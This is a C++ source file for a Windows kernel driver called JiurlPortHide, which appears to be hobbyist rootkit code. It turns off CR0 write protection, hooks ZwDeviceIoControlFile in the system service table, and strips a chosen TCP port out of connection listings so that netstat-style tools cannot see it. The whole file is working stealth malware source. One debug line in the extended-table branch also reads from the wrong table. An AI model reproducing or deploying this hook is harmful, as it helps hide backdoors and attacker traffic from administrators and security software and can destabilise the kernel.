#if 0 //================================================================
	Copyright (c) JIURL, All Rights Reserved
========================================================================

/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/

Module Name:

	JiurlPortHide.cpp

About:

  - This Driver Project is created by a AppWizard written by me.

  [ HomePage ]  http://jiurl.yeah.net
                ~~~~~~~~~~~~~~~~~~~~~
  [ Email    ]  jiurl@mail.china.com
                ~~~~~~~~~~~~~~~~~~~~
  [ Forum    ]  http://jiurl.cosoft.org.cn/forum/index.php
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/
#endif


#ifdef __cplusplus
extern "C"
{
#endif

#include <ntddk.h>

#include "JiurlPortHide.h"
#include "Jiurl_tcpioctl.h"

#ifdef __cplusplus
}
#endif

NTSTATUS 
DriverEntry(IN PDRIVER_OBJECT DriverObject,
			IN PUNICODE_STRING RegistryPath)
{
	DbgPrint("JiurlPortHide: Hello,This is DriverEntry!\n");

	DriverObject->MajorFunction[IRP_MJ_CREATE]         = 
	DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DriverDispatch; 
	DriverObject->DriverUnload                         = DriverUnload; 

	// save old system call locations
	OldZwDeviceIoControlFile = (ZWDEVICEIOCONTROLFILE)(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]);

	_asm
	{
		CLI					//dissable interrupt
		MOV	EAX, CR0		//move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV	CR0, EAX		//write register back
	}

	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) = (ULONG)NewZwDeviceIoControlFile;

	_asm 
	{
		MOV	EAX, CR0		//move CR0 register into EAX
		OR	EAX, 10000H		//enable WP bit 	
		MOV	CR0, EAX		//write register back		
		STI					//enable interrupt
	}
        			
	return STATUS_SUCCESS;
}

NTSTATUS
DriverDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP           Irp
    )
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest (Irp,IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}

void DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("JiurlPortHide: Bye,This is DriverUnload!\n");

	_asm
	{
		CLI					//dissable interrupt
		MOV	EAX, CR0		//move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV	CR0, EAX		//write register back
	}

	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) = (ULONG)OldZwDeviceIoControlFile;

	_asm 
	{
		MOV	EAX, CR0		//move CR0 register into EAX
		OR	EAX, 10000H		//enable WP bit 	
		MOV	CR0, EAX		//write register back		
		STI					//enable interrupt
	}
}

NTSTATUS NewZwDeviceIoControlFile(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength
)
{
	NTSTATUS rc;

	rc = ((ZWDEVICEIOCONTROLFILE)(OldZwDeviceIoControlFile)) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		IoControlCode,
		InputBuffer,
		InputBufferLength,
		OutputBuffer,
		OutputBufferLength
		);

	if(IoControlCode != IOCTL_TCP_QUERY_INFORMATION_EX)
	{
		return(rc); 
	}

	TCP_REQUEST_QUERY_INFORMATION_EX	req;
	TCPAddrEntry*						TcpTable;
	TCPAddrExEntry*						TcpExTable;
	ULONG								numconn;
	LONG								i;

	DbgPrint("JiurlPortHide: IOCTL_TCP_QUERY_INFORMATION_EX\n");

	if( NT_SUCCESS( rc ) ) 
	{
		req.ID.toi_entity.tei_entity    = CO_TL_ENTITY;
		req.ID.toi_entity.tei_instance  = 0;
		req.ID.toi_class                = INFO_CLASS_PROTOCOL;
		req.ID.toi_type                 = INFO_TYPE_PROVIDER;
		req.ID.toi_id                   = TCP_MIB_ADDRTABLE_ENTRY_ID;

		if( !memcmp( InputBuffer, &req, sizeof(TDIObjectID) ) )
		{
			numconn  = IoStatusBlock->Information/sizeof(TCPAddrEntry);
			TcpTable = (TCPAddrEntry*)OutputBuffer;

			for( i=0; i<numconn; i++ )
			{
				if( ntohs(TcpTable[i].tae_ConnLocalPort) == PORTHIDE )
				{
					DbgPrint("JiurlPortHide: HidePort %d\n", ntohs(TcpTable[i].tae_ConnLocalPort));

					memcpy( (TcpTable+i), (TcpTable+i+1), ((numconn-i-1)*sizeof(TCPAddrEntry)) );
					numconn--;
					i--;
				}
			}

			IoStatusBlock->Information = numconn*sizeof(TCPAddrEntry);
			return(rc);
		}


		req.ID.toi_id                   = TCP_MIB_ADDRTABLE_ENTRY_EX_ID;

		if( !memcmp( InputBuffer, &req, sizeof(TDIObjectID) ) )
		{
			numconn    = IoStatusBlock->Information/sizeof(TCPAddrExEntry);
			TcpExTable = (TCPAddrExEntry*)OutputBuffer;

			for( i=0; i<numconn; i++ )
			{
				if( ntohs(TcpExTable[i].tae_ConnLocalPort) == PORTHIDE )
				{
					DbgPrint("JiurlPortHide: HidePort %d\n",ntohs(TcpTable[i].tae_ConnLocalPort));

					memcpy( (TcpExTable+i), (TcpExTable+i+1), ((numconn-i-1)*sizeof(TCPAddrExEntry)) );
					numconn--;
					i--;
				}
			}

			IoStatusBlock->Information = numconn*sizeof(TCPAddrExEntry);
			return(rc);
		}
	}

	return(rc);
}

